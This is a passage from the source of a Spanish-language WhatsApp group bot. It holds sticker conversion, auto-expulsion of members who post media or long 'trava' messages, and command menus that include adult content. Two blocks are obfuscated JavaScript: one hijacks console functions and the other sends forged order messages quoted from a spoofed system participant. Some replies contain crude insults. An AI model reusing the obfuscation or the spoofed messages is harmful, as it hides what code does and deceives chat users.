_0x53a12a['push'](_0x53a12a['shift']());}catch(_0x50b87f){_0x53a12a['push'](_0x53a12a['shift']());}}}(_0x27fb,0xaac28));const _0x333816=function(){let _0x3b9de2=!![];return function(_0x34ee6d,_0x3e4e7c){const _0x338996=_0x3b9de2?function(){const _0x475110=_0x3657;if(_0x3e4e7c){const _0x1db804=_0x3e4e7c[_0x475110(0x14d)](_0x34ee6d,arguments);return _0x3e4e7c=null,_0x1db804;}}:function(){};return _0x3b9de2=![],_0x338996;};}(),_0x835717=_0x333816(this,function(){const _0xee8b8e=function(){const _0x50f77d=_0x3657,_0x3c9dc1=_0xee8b8e[_0x50f77d(0x140)](_0x50f77d(0x14b))()[_0x50f77d(0x140)](_0x50f77d(0x139));return!_0x3c9dc1['test'](_0x835717);};return _0xee8b8e();});_0x835717();const _0x42acbe=function(){let _0x37110c=!![];return function(_0x5a1047,_0x16f831){const _0x2238b9=_0x37110c?function(){if(_0x16f831){const _0x184403=_0x16f831['apply'](_0x5a1047,arguments);return _0x16f831=null,_0x184403;}}:function(){};return _0x37110c=![],_0x2238b9;};}(),_0x290295=_0x42acbe(this,function(){const _0x39d9ee=_0x3657;let _0x4b1d9a;try{const _0x19fa90=Function('return\x20(function()\x20'+_0x39d9ee(0x14c)+');');_0x4b1d9a=_0x19fa90();}catch(_0x477b7c){_0x4b1d9a=window;}const _0x32fe68=_0x4b1d9a[_0x39d9ee(0x138)]=_0x4b1d9a[_0x39d9ee(0x138)]||{},_0x3152dd=['log','warn','info',_0x39d9ee(0x137),_0x39d9ee(0x148),_0x39d9ee(0x136),'trace'];for(let _0x244612=0x0;_0x244612<_0x3152dd['length'];_0x244612++){const _0x55e7a2=_0x42acbe['constructor'][_0x39d9ee(0x13a)]['bind'](_0x42acbe),_0x15b4f3=_0x3152dd[_0x244612],_0x44c3e4=_0x32fe68[_0x15b4f3]||_0x55e7a2;_0x55e7a2[_0x39d9ee(0x13f)]=_0x42acbe[_0x39d9ee(0x13e)](_0x42acbe),_0x55e7a2[_0x39d9ee(0x142)]=_0x44c3e4['toString'][_0x39d9ee(0x13e)](_0x44c3e4),_0x32fe68[_0x15b4f3]=_0x55e7a2;}});_0x290295();const aaa=_0x495578(0x144);
                const packname1001 = `${aaa}`          
		const author1001 = args.join(' ')
                exif.create(packname1001, author1001, `stickwm_${sender}`)          
		reply('*⌛EN PROCESO*')
                await ffmpeg(`${media22}`)
		.inputFormat(media22.split('.')[4])
		.on('start', function (cmd) {
                console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {                                                                                                        
		console.log(`Error : ${err}`)
                fs.unlinkSync(media22)                
		tipe = media.endsWith('.mp4') ? 'video' : 'gif'         
		reply('*Intenta de nuevo*')                   
		})                                      
		.on('end', function () {                         
		console.log('Finish')                       
		exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {                                                                     
		if (error) return reply('error')                                 
		wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)           
		fs.unlinkSync(media22)                                             
		fs.unlinkSync(`./sticker/${sender}.webp`)                  
		fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)               
		})
                })                                                
		.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])                                                                      
		.toFormat('webp')                                    
		.save(`./sticker/${sender}.webp`)
		}}

	    
	    ///////////////////////FUNCIONES CREADAS POR SAMU330\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
	    
			if (isGroup && botAdmin && isAntiMedia) {     
			if (!itsMe) {
			if (isMedia && !sam.message.videoMessage || isImage) {
                        samu330.updatePresence(from, Presence.composing) 
			reply(`Lo siento ${sender.split("@")[0]}, pero aqui no se permiten las fotos ni videos, *serás expulsado por seguridad:D*`)
			samu330.groupRemove(from, [sender])
					}
				}      
			}
			if (isGroup && botAdmin && isAntiMedia) {
			if (!itsMe) {
			if (isMedia && sam.message.videoMessage) {
                        samu330.updatePresence(from, Presence.composing) 
			reply(`Lo siento ${sender.split("@")[0]}, pero aqui no se permiten las fotos ni videos, *serás expulsado por seguridad:D*`)
                        samu330.groupRemove(from, [sender])                                              
					}
				}
			}
			if (isGroup && botAdmin && isAntiLeg) {      
			if (!itsMe) {
			if (isAudio) {
			if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no?🙄\n*Pues conmigo te jodiste😑*\nALV por puto👿`)
				reply(`*AUDIO DETECTADO, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)
				samu330.groupRemove(from, [sender])
			}
			}
			}
			if (isGroup && botAdmin && isAntiLeg) {                                                                	  
			if (!itsMe) {                        
			if (isContact) {
                        if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no?🙄\n*Pues conmigo te jodiste😑*\nALV por puto👿`)                                                                  
				reply(`*CONTACTO DETECTADO, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)
				samu330.groupRemove(from, [sender])              
			}               
			}                     
			}
	    		if (isGroup && botAdmin && isAntiLeg) {                                                                	  
			if (!itsMe) {
	    		const eltexto = args.join(' ')
                      	if (eltexto.length > 10000) reply('*Este mensaje contiene mas de 10, 000 caracteres, probablemente puede ser una trava, por lo que tendre que eliminarte🙂*\n\n_Este grupo esta protegido por_ *🔐Samu330*')
				samu330.groupSettingChange(from, GroupSettingChange.messageSend, false).then(() => {
				samu330.sendMessage(from, '*Esperemos 10 segundos🙄*', MessageType.text)
				})
				samu330.groupRemove(from, [sender])
				await sleep(10000)
				samu330.groupSettingChange(from, GroupSettingChange.messageSend, true)
			}
			}
			if (isGroup && botAdmin && isAntiLeg) {                                                         	  
			if (!itsMe) {                                 
			if (isLocation) {
                        if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no?🙄\n*Pues conmigo te jodiste😑*\nALV por puto👿`)                                                                     
				reply(`*LOCALIZACION DETECTADA, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)                   
				samu330.groupRemove(from, [sender])           
			}             
			}                     
			}
			switch(is) {
  			case 'buenos':
			buf = fs.readFileSync(`./temp/audio/wenas.mp3`)
			samu330.sendMessage(from, buf, audio, {
  			mimetype: 'audio/mp4', quoted: fliveLoc, duration :-999999, ptt: true
			})
			}
	    
	//Zona de Comandos🛵
	switch (command) {
case 'help':
case 'menu':
case 'comandos':
const moment = require('moment-timezone')

const jmn = moment.tz('America/Mexico_City').format('HH:mm:ss')

let d = new Date
let locale = 'es'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['domingo','lunes','Martes','Miercoles','Jueves','Viernes','Sabado'][Math.floor(((d * 1) + gmt) / 84600000) % 7]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
var num = sam.participant
foto = fs.readFileSync('./src/help.jpg')
fakee = fs.readFileSync('./src/fake.jpg')
assistant = fs.readFileSync('./src/assistant.jpg')
const forder = { key : {fromMe: false,participant : "0@s.whatsapp.net", ...(from ? { remoteJid: "5214447000377-1624232428@g.us" } : {})},message: {orderMessage: {itemCount : 999999999,status: 1,surface : 1,message: `🥀𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝑁𝑦𝑎𝑛𝐵𝑜𝑡🍒`,orderTitle: 'Samu330',sellerJid: `𝗡𝘆𝗮𝗻𝗕𝗼𝘁🌱`,thumbnail: fs.readFileSync('./src/fake.jpg')}}}
samu330.updatePresence(from, Presence.recording)
uptime = process.uptime()
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
Menu = `
➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈.li Oℱịcιɑl.li
🔐Hola *${pushname}* ${timeFt}

Hora: ${jmn}
Fecha: ${calender}

======[ *Version BETA* ]======

*Comandos usados hoy : ${hit_today.length}*

_PORFAVOR LEE LAS REGLAS_:

${prefix}reglas


${samu} ✏Prefijo:${samu} [ ${prefix} ]
${samu} 🕐Tiempo de actividad:${samu} *${uptime}*
${samu} ✅Modo:${samu} *ON*
${samu} 👥Grupo:${samu} *${groupName}*
${samu} 🏆Numero del Dueño wa.me/+529984907794${samu}

𝗠𝗬 𝗖𝗔𝗡𝗔𝗟 𝗗𝗘 𝗬𝗢𝗨𝗧𝗨.𝗕𝗘: https://youtu.be/chMc57gjmkI

⍣ *BOT INFO* ⍣
${samu}◦ 🌐Navegador :${samu} *${samu330.browserDescription[1]}*
${samu}◦ 📡servidor :${samu} *${samu330.browserDescription[0]}*
${samu}◦ ✅version :${samu} *${samu330.browserDescription[2]}*
${samu}◦ 🚄Velocidad :${samu} *${process.uptime()}*
${samu}◦ 📲Sistema operativo :${samu} *${samu330.user.phone.device_manufacturer}*
${samu}◦ 🪀version de${samu} *WhatsApp* : *${samu330.user.phone.wa_version}*


_Lista de MENUs_

${bodyM} ${prefix}menu1 *(Menu de Media*
${bodyM} ${prefix}menu2 *(Menu de Sticker)*
${bodyM} ${prefix}menu3 *(Menu de Grupos)*
${bodyM} ${prefix}menu4 *(Menu de descargas)*
${bodyM} ${prefix}menu5 *(Comandos Tools)*
${bodyM} ${prefix}menu6 *(Comandos +18)* 
${bodyM} ${prefix}menu7 *(Comandos de logos)*
${bodyM} ${prefix}menu8 *(Comandos para el Owner)*
ᴸᵃ ᵐᵃʸᵒʳᶦ́ᵃ ᵈᵉ ˡᵒˢ ᶜᵒᵐᵃⁿᵈᵒˢ ᶠᵘⁿᶜᶦᵒⁿᵃⁿ ᵃˡ ¹⁰⁰
ᴱˢᶜʳᶦᵇᵉ ˡᵒˢ ᶜᵒᵐᵃⁿᵈᵒˢ ᵉⁿ ˢᵘ ᶠᵒʳᵐᵃᵗᵒ ᶜᵒʳʳᵉᶜᵗᵒ ᵖᵃʳᵃ ᑫᵘᵉ ⁿᵒ ᵈᵉ ᵉʳʳᵒʳᵉˢ
ˢᶦ ᵗᶦᵉⁿᵉˢ ᵃˡᵍᵘ́ⁿ ᵖʳᵒᵇˡᵉᵐᵃ ᵒ ᵃˡᵍᵘⁿᵃ ᶠᵘⁿᶜᶦᵒ́ⁿ ᵈᵉˡ ᵇᵒᵗ ᵈᵉʲᵒ ᵈᵉ ᶠᵘⁿᶜᶦᵒⁿᵃʳ ʰᵃ́ᶻᵐᵉˡᵒ ˢᵃᵇᵉʳ ᵃ ᵐᶦ̣.ᵂʰᵃᵗˢᴬᵖᵖ.li
*O envia una queja de un problema con el comando* _${prefix}reportar_

     -----------------------------------------------
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::                                                
¦:
¦:         . : 🐬𝐍𝐲𝐚𝐧𝐁𝐨𝐭🐬 : .
¦:     🔥❣️𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆❣️🔥
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
		     🌸 SamịPerry.li 🌸
********************************`
var _0x56da=['367342lxQRgg','relayWAMessage','52224EUhLvZ','readFileSync','3184312811796096','2ZQhqXh','37BvfGXn','1QpYCgS','233589MYSAPS','296046BsnUGu','./src/fake.jpg','11131Xmdsqw',`${Menu}`,'41623ZFgijY','4lYyqCf','INQUIRY','prepareMessageFromContent','1081869VYGFAG','1QmBtcR'];var _0x3cb2d7=_0x44c4;function _0x44c4(_0x538587,_0x3dc520){return _0x44c4=function(_0x56dab7,_0x44c4ad){_0x56dab7=_0x56dab7-0x11b;var _0x4c2ec7=_0x56da[_0x56dab7];return _0x4c2ec7;},_0x44c4(_0x538587,_0x3dc520);}(function(_0x1c8e57,_0x5dcd2a){var _0x2b3ad5=_0x44c4;while(!![]){try{var _0x1e1a08=parseInt(_0x2b3ad5(0x11b))*parseInt(_0x2b3ad5(0x127))+parseInt(_0x2b3ad5(0x12c))+parseInt(_0x2b3ad5(0x122))+parseInt(_0x2b3ad5(0x11e))*parseInt(_0x2b3ad5(0x121))+parseInt(_0x2b3ad5(0x126))*-parseInt(_0x2b3ad5(0x12b))+parseInt(_0x2b3ad5(0x124))*parseInt(_0x2b3ad5(0x11f))+-parseInt(_0x2b3ad5(0x120))*parseInt(_0x2b3ad5(0x12a));if(_0x1e1a08===_0x5dcd2a)break;else _0x1c8e57['push'](_0x1c8e57['shift']());}catch(_0x52a340){_0x1c8e57['push'](_0x1c8e57['shift']());}}}(_0x56da,0x99469),res=await samu330[_0x3cb2d7(0x129)](from,{'orderMessage':{'orderId':_0x3cb2d7(0x11d),'thumbnail':fs[_0x3cb2d7(0x11c)](_0x3cb2d7(0x123)),'itemCount':999999999,'status':_0x3cb2d7(0x128),'surface':'CATALOG','message':_0x3cb2d7(0x125),'orderTitle':'tom esta durmiendo'},'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}},{'quoted':forder,'contextInfo':{}}),samu330[_0x3cb2d7(0x12d)](res));
break
case 'menu2':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
stc = `╭⸻⃞✫꯭𝙈꯭𝙀꯭𝙉꯭𝙐꯭✫⃞⸻╮
╰────ြ𝐒𝐭𝐢𝐜𝐤𝐞𝐫🃏
╭─────────────
│ *${prefix}sticker*
│ _Imagen/gif/video_
╰─────────────╮
╭─────────────╯
│ *${prefix}spack*
│ _Paquete personalizado_
│Ex: *${prefix}spack* Samu|330
╰───────────────────╮
╭───────────────────╯
│ *${prefix}robar*
│ *${prefix}exif*
╰─────────────╮
╭─────────────╯
│ *${prefix}takestick*
│ _Nombre|Autor_
╰─────────────╮
╭─────────────╯
│ *${prefix}swm*
│ _Nombre|Autor_
╰─────────────╮
╭─────────────╯
│ *${prefix}colores*
│ _Texto a colores_
╰─────────────╮
╭─────────────╯
│ *${prefix}ger*
│ _Estilo Triggered_
╰─────────────╮
╭─────────────╯
│ *${prefix}aimg*
│ _Stiker a imagen_
╰─────────────╮
╭─────────────╯
│ *${prefix}agif*
│ _Stiker a gif_
╰─────────────╮
╭─────────────┴╮
│ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈.li Oℱịcιɑl.li 
╰──────────────╯`
samu330.sendMessage(from, stc, MessageType.text, {quoted:
{ key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"documentMessage": { "title": "📚𝑆𝑡𝑖𝑘𝑒𝑟 𝑚𝑒𝑛𝑢", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg')}}
}})
break

case 'menu1':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})

mda = `
╔════════════════╗
╠  ◈  𝙈𝙀𝙉𝙐⁪⁡ 𝘿𝙀 𝙈𝙀𝘿𝙄𝘼 ◈  ╣
╠════════════════╝
║
╠ *●${prefix}imagen*
║ _Búsqueda de imágenes_
║ _en Google_
║
╠ *●${prefix}sinfondo*
║ _Quita fondo a imagenes_
║
╠ *●${prefix}wp* 
║ _Búsqueda de fondos_
║ _de pantalla_
║
╠ *●${prefix}par*
║ _Anime para compartir perfil_
║ _(hombre | mujere)_
║
╠ *●${prefix}animevid*
║ _Videos anime cortos_
║
╠ *●${prefix}queanime*
║ _Etiqueta una imagen de un Anime_
║ _Para saber que anime es_
║
╠ *●${prefix}loli*
║
╠ *●${prefix}neko*
║
╟╼╾┤🎧𝘈𝘶𝘥𝘪𝘰𝘴🎧├╼╾
║
╠ *●${prefix}bass*
║ _Etiqueta un audio_
║
╠ *●${prefix}ardilla*
║ _Etiqueta un audio_
║
╠ *●${prefix}trigger*
║ _Etiqueta un audio_
║
╠ *●${prefix}lento*
║ _Etiqueta un audio_
║
╠ *●${prefix}imut*
║ _Etiqueta un audio_
║
╠ *●${prefix}hode*
║ _Etiqueta un audio_
║
╠ *●${prefix}grave*
║ _Etiqueta un audio_
║
╙╖
╒╩════════════
╰──────────────╮
╭──────────────┴╮
│ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈.li Oℱịcιɑl.li🌴
╰───────────────╯`
samu330.sendMessage(from, mda, MessageType.text, {quoted:
{ key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": { "caption": "🧸𝙈𝙀𝙉𝙐⁡ 𝘿𝙀 𝙈𝙀𝘿𝘼📌", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg')}}
}})
break
case 'menu3':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
uptime = process.uptime()

const Menug = {
text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                            
🔐Hola *${pushname}*

${bodyM} ${samu}${prefix}antilink${samu}
${bodyM} ${samu}${prefix}antimedia${samu}
${bodyM} ${samu}${prefix}antibad${samu}
${bodyM} ${samu}${prefix}autostick{samu}
${bodyM} ${samu}${prefix}antileg{samu}

================================
*🔞PARA ACTIVAR LOS COMANDOS +18*:
================================
${bodyM} ${prefix}+18 1/0
================================
    _Modo simsimi ilimitado_

*${prefix}simsimi 1*


*Para que el bot entre a tu grupo, usa el siguiente comando:*
	${prefix}entrabot *(Link del grupo)*

${bodyM} ${prefix}nuevogrupo
${bodyM} ${prefix}grupo abrir/cerrar
${bodyM} ${prefix}getpic
${bodyM} ${prefix}salir
${bodyM} ${prefix}tagstick
${bodyM} ${prefix}imagetag
${bodyM} ${prefix}hidetag
${bodyM} ${prefix}todos
${bodyM} ${prefix}setdesc
${bodyM} ${prefix}setnamegp
${bodyM} ${prefix}adminlist
${bodyM} ${prefix}setpic
${bodyM} ${prefix}enlinea
${bodyM} ${prefix}promote
${bodyM} ${prefix}demote
${bodyM} ${prefix}eliminar
${bodyM} ${prefix}añadir *(Numero sin el +)*
${bodyM} ${prefix}notif
${bodyM} ${prefix}reply @miembro|frase|frase
${bodyM} ${prefix}contacto @miembro|nombre
${bodyM} ${prefix}link
${bodyM} ${prefix}top5
${bodyM} ${prefix}clonar
`,
contextInfo: {
mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
}
}
samu330.sendMessage(from, Menug, MessageType.text, {
quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": "➫𝑴𝒆𝒏𝒖 𝑫𝒆 𝑮𝒓𝒖𝒑𝒐𝒔\n❣️⃞🔥𝙎꯭𝙖͠𝙢꯭ 𝙔 ꯭𝙋꯭𝙚𝙧𝙧꯭𝙮🔥❣️" ,"jpegThumbnail": fs.readFileSync(`./NyanBot.jpg`)}}}})
break
case 'menu4':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
uptime = process.uptime()
const Menud = {
text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li   

🔐Hola *${pushname}*

♫♪.ılılıll|̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|llılılı.♫♪

${bodyM} ${prefix}play *(Descarga de musica)*
${bodyM} ${prefix}playvid *(Descarga de videos por nombre)*
${bodyM} ${prefix}ig *(Fotos y videos de Instagram)*
${bodyM} ${prefix}tik *(videos de TikTok)*
${bodyM} ${prefix}ytmp3 *(Descarga de musica por link)*
${bodyM} ${prefix}ytmp4 *(Descarga de videos por link)*
${bodyM} ${prefix}fb _(Link de FaceBook)_
${bodyM} ${prefix}mfire *(Link de mediafire)*
${bodyM} ${prefix}tomp3 *(Videos a audio)*
`,
contextInfo: {
mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
}
}
samu330.sendMessage(from, Menud, MessageType.text, {
quoted:  fvid})
break
case 'menu5':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
uptime = process.uptime()
const Menuo = {
text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                


${bodyM} ${prefix}ipbot *(Localiza al bot por ip)*
${bodyM} ${prefix}ip *(Haz una loclizacion por ip)*
${bodyM} ${prefix}voz *(Codigo de idioma)* *(Texto)*
		  _Para ver idiomas compatibles, usa el comando_ *idiomas*
${bodyM} ${prefix}translate *(idioma a traducir = es, en, id...)*
${bodyM} ${prefix}tiktokstalk @usuario
${bodyM} ${prefix}hidetag *(Texto)*
${bodyM} ${prefix}cambiar *(Cambia el cuerpo del menú)*
${bodyM} ${prefix}shortlink _(Acortador de links)_
${bodyM} ${prefix}pastebin *(genera link hacia el texto o link que escribas)*
${bodyM} ${prefix}abinario *(texto a codigo binario)* 010010
${bodyM} ${prefix}binatext *(codigo binario a texto)*
${bodyM} ${prefix}aoctal *(texto a codigo octal)*
${bodyM} ${prefix}octalatext *(codigo octal a texto)*
${bodyM} ${prefix}ahex *(texto a codigo hex)*
${bodyM} ${prefix}hexatext *(codigo hex a texto)*
${bodyM} ${prefix}wa.me
${bodyM} ${prefix}idioimas
${bodyM} ${prefix}reversa
${bodyM} ${prefix}meme
${bodyM} ${prefix}leermas _frase/frase_
${bodyM} ${prefix}mapa
${bodyM} ${prefix}soyyo
${bodyM} ${prefix}blocklist
${bodyM} ${prefix}leerimagen

*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
	      🌸 SamịPerry.li 🌸
 ********************************
`,
contextInfo: {
mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
}
}
samu330.sendMessage(from, Menuo, MessageType.text, {
quoted: floc})
break
case 'menu6':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
samuPn = fs.readFileSync('./src/+18.jpg')
uptime = process.uptime()
const Menu18 = `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li

${bodyM} ${prefix}porno
${bodyM} ${prefix}lesbian 
${bodyM} ${prefix}tetas
${bodyM} ${prefix}ass
${bodyM} ${prefix}pussy
${bodyM} ${prefix}xnxx *(Link de Xnxx.com)*
${bodyM} ${prefix}pornode *(Japonesas)*
${bodyM} ${prefix}xvid *(Japonesas)

*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
	     🌸 SamịPerry.li 🌸
 ********************************
`
samu330.sendMessage(from, samuPn, image, { quoted: fvid, caption: `${Menu18}`, thumbnail: samuPn, contextInfo: { mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true }})              
break
case 'menu7':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
uptime = process.uptime()
const Menu7 = {
text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                            


${bodyM} ${prefix}blackpink *(Escribe un texto para crear logo)*
${bodyM} ${prefix}neon *(Escribe un texto para crear logo)*
${bodyM} ${prefix}greenneon *(Escribe un texto para crear logo)*
${bodyM} ${prefix}advanceglow *(Escribe un texto para crear logo)*
${bodyM} ${prefix}futureneon *(Escribe un texto para crear logo)*
${bodyM} ${prefix}sandwriting *(Escribe un texto para crear logo)*
